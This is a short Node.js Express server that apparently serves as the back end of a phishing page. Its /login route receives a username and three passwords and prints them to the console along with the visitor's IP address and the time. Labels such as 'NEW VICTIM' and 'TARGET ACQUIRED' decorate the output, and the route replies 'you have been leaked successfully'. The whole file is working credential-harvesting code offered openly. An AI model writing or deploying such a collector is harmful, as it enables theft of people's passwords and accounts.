import express from "express";
import chalk from "chalk";
import cors from "cors";

const app = express();
const PORT = 3000;

const logger = (req, res, next) => {
  const time = new Date().toLocaleTimeString();

  console.log(
    chalk.blue(`[${time}]`) +
      " " +
      chalk.green(req.method) +
      " " +
      chalk.yellow(req.originalUrl),
  );

  next();
};

app.use(express.json());
app.use(cors());
app.set("view engine", "ejs");
app.use(logger);
app.use(express.static("public"));

const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

const typeText = async (text, delay = 25) => {
  for (let char of text) {
    process.stdout.write(char);
    await sleep(delay);
  }
  process.stdout.write("\n");
};

const typeLine = async (prefix, value, delay = 45) => {
  process.stdout.write(prefix);
  await typeText(value, delay);
};

const getTime = () => {
  const now = new Date();

  const time = now.toLocaleTimeString("en-US", {
    hour: "numeric",
    minute: "2-digit",
    hour12: true,
  });

  const day = String(now.getDate()).padStart(2, "0");
  const month = String(now.getMonth() + 1).padStart(2, "0");
  const year = String(now.getFullYear()).slice(-2);

  return `${time}, ${day}.${month}.${year}`;
};

const printInfo = async (username, passwords, time, ip) => {
  await typeText(
    chalk.grey("\n./SYSTEM INITIALISED, WITH A NEW VICTIM !!!\n"),
    60,
  );

  console.log(chalk.yellow.underline("[TARGET ACQUIRED]"));

  await typeLine(chalk.green("> USERNAME: "), chalk.bold(username));

  await typeLine(
    chalk.green("> PASSWORDS: "),
    chalk.bold(`${passwords[0]}, ${passwords[1]}, ${passwords[2]}`),
  );

  await typeLine(chalk.grey("> TIME: "), time);

  console.log(chalk.grey("> IP ADDRESS: ") + ip);

  console.log(chalk.red("connection terminated...\n"));
};

app.get("/", (req, res) => {
  res.render("home");
});

app.post("/login", async (req, res) => {
  const { username, passwords } = req.body;

  await printInfo(username, passwords, getTime(), req.ip);
  res.json("you have been leaked successfully :)");
});

console.log(
  chalk.bgBlue(
    ` Created by ${chalk.bold("KISHAN KUMAR")}, Contact: ${chalk.underline("@KishanDevX")} on GitHub `,
  ),
);

app.listen(PORT, () => {
  console.log(
    chalk.greenBright("Server started, monitoring incoming credentials..."),
  );
  console.log();
});
